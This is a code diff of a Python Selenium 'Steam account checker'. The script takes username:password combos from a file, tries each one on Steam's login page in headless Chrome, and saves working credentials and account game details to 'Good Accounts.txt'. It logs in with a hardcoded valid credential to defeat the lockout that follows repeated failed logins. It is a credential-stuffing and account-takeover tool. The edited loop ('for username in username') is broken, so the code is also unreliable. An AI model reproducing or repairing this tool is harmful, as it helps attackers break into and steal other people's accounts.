@@ -1,7 +1,7 @@
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 import re,time
-import colorama 
+import colorama
 from colorama import Fore, Back, Style
 
 colorama.init()
@@ -12,84 +12,84 @@ print( """\
 ╔═╗╔╦╗╔═╗╔═╗╔╦╗  ╔═╗╔═╗╔═╗╔═╗╦ ╦╔╗╔╔╦╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
 ╚═╗ ║ ║╣ ╠═╣║║║  ╠═╣║  ║  ║ ║║ ║║║║ ║   ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
 ╚═╝ ╩ ╚═╝╩ ╩╩ ╩  ╩ ╩╚═╝╚═╝╚═╝╚═╝╝╚╝ ╩   ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
-Discord: discord.gg/HMMGKdC
-Github: github.com/Galerici
+Original: github.com/Galerici
+actual: github.com/lilkdi/SteamAccountChecker
                                                                                                                          
                                                        
  """ )
 
-kaçtanedebirdoğrugirelim = 3
-doğruhesap = "kutxyromero:123456"
+howmanyentercorly = 3
+correctaccount = "kutxyromero:123456"
 
-ardardaunposible = 0
+reptdlyimpsbl = 0
 
 
 
-hesaplar = re.findall("\w{5,30}[@]?\w{1,10}[.]?\w{1,30}[:]\S+",open("accounts.txt","r", encoding="utf8").read())
-hesaplarlength = len(hesaplar)
+unames = re.findall("\w{5,30}[@]?\w{1,10}[.]?\w{1,30}[:]\S+",open("accounts.txt","r", encoding="utf8").read())
+unameslength = len(unames)
 
-def doğruhesapyap(hesap):
-    global ardardaunposible
+def correctaccountcalc(username):
+    global reptdlyimpsbl
     options = webdriver.ChromeOptions()
     options.add_argument("--incognito")
-    # options.add_argument("--headless")
+    options.add_argument("--headless")
     options.add_argument("log-level=2")
     chrome = webdriver.Chrome(options=options)
     chrome.get("https://store.steampowered.com/login/")
-    hesap = hesap.split(":")
-    chrome.find_element_by_id("input_username").send_keys(hesap[0])
-    chrome.find_element_by_id("input_password").send_keys(hesap[1])
+    username = username.split(":")
+    chrome.find_element_by_id("input_username").send_keys(username[0])
+    chrome.find_element_by_id("input_password").send_keys(username[1])
     chrome.find_element_by_id("input_password").send_keys(Keys.ENTER)
-    def bekle():
-        global hataoldumu,ardardaunposible
+    def w8():
+        global isiterror,reptdlyimpsbl
         try:
             if (chrome.find_element_by_id("login_btn_wait").is_displayed()):
                 time.sleep(0.3)
-                bekle()
+                w8()
                 return 0
         except:
             time.sleep(2)
-            ardardaunposible = 0
+            reptdlyimpsbl = 0
             chrome.quit()
-    bekle()
+    w8()
 
-def hesapyap(hesap, kaçıncı = 0):
+def accountcalc(username, whichthe = 0):
     options = webdriver.ChromeOptions()
     options.add_argument("--incognito")
-    #options.add_argument("--headless")
+    options.add_argument("--headless")
     options.add_argument("log-level=2")
     chrome = webdriver.Chrome(options=options)
     chrome.get("https://store.steampowered.com/login/")
-    hesap = hesap.split(":")
-    chrome.find_element_by_id("input_username").send_keys(hesap[0])
-    chrome.find_element_by_id("input_password").send_keys(hesap[1])
+    username = username.split(":")
+    chrome.find_element_by_id("input_username").send_keys(username[0])
+    chrome.find_element_by_id("input_password").send_keys(username[1])
     chrome.find_element_by_id("input_password").send_keys(Keys.ENTER)
-    hataoldumu = False
-    def bekle():
-        global hataoldumu,ardardaunposible
+    isiterror = False
+    def w8():
+        global isiterror,reptdlyimpsbl
         try:
             if (chrome.find_element_by_id("login_btn_wait").is_displayed()):
                 time.sleep(0.3)
-                bekle()
+                w8()
                 return 0
             else:
                 time.sleep(2)
                 if len(chrome.find_element_by_id("error_display").text) > 2:
-                    print("Account Bad  (" + str(kaçıncı) + "/" + str(hesaplarlength) + ")")
-                    ardardaunposible += 1
+                    print("Account Bad  (" + str(whichthe) + "/" + str(unameslength) + ")")
+                    reptdlyimpsbl += 1
                     chrome.quit()
                 else:
                     time.sleep(0.5)
                     if len(chrome.find_elements_by_class_name("newmodal")) > 0:
-                        print("Mail Protect  (" + str(kaçıncı) + "/" + str(hesaplarlength) + ")")
-                        open("mailprotectedaccounts.txt", "a").writelines(hesap[0] + ":" + hesap[1] + "\n")
-                        ardardaunposible += 1
+                        print("Mail Protect  (" + str(whichthe) + "/" + str(unameslength) + ")")
+                        open("mailprotectedaccounts.txt", "a").writelines(username[0] + ":" + username[1] + "\n")
+                        reptdlyimpsbl += 1
                         chrome.quit()
         except:
-            print("Account Good (" + str(kaçıncı) + "/" + str(hesaplarlength) + ")")
-            ardardaunposible = 0
+            print("Account Good (" + str(whichthe) + "/" + str(unameslength) + ")")
+            reptdlyimpsbl = 0
             print("Oyun Bilgileri Alınıyor")
-            open("Good Accounts.txt", "a").writelines(hesap[0] + ":" + hesap[1] + "\n")
+            open("Good Accounts.txt", "a").writelines(username[0] + ":" + username[1] + "\n")
             time.sleep(2)
             chrome.get(chrome.find_element_by_xpath(
                 "/html/body/div[1]/div[7]/div[1]/div/div[3]/div/div[3]/div/a[1]").get_attribute("href"))
@@ -101,18 +101,18 @@ def hesapyap(hesap, kaçıncı = 0):
             open("Good Accounts.txt", "a").writelines("}" + "\n")
             open("Good Accounts.txt", "a").writelines("-----------------------" + "\n")
             chrome.quit()
-    bekle()
+    w8()
 
 
-kaçıncı = 0
-for hesap in hesaplar:
-    kaçıncı += 1
-    if ardardaunposible == kaçtanedebirdoğrugirelim:
+whichthe = 0
+for username in username:
+    whichthe += 1
+    if reptdlyimpsbl == howmanyentercorly:
         print("Performing Verification...")
-        doğruhesapyap(doğruhesap)
+        correctaccountcalc(correctaccount)
         print("Verification Ok")
-        hesapyap(hesap,kaçıncı)
+        accountcalc(username,whichthe)
         kaçlıkombo = 0
     else:
-        hesapyap(hesap,kaçıncı)
+        accountcalc(username,whichthe)
 
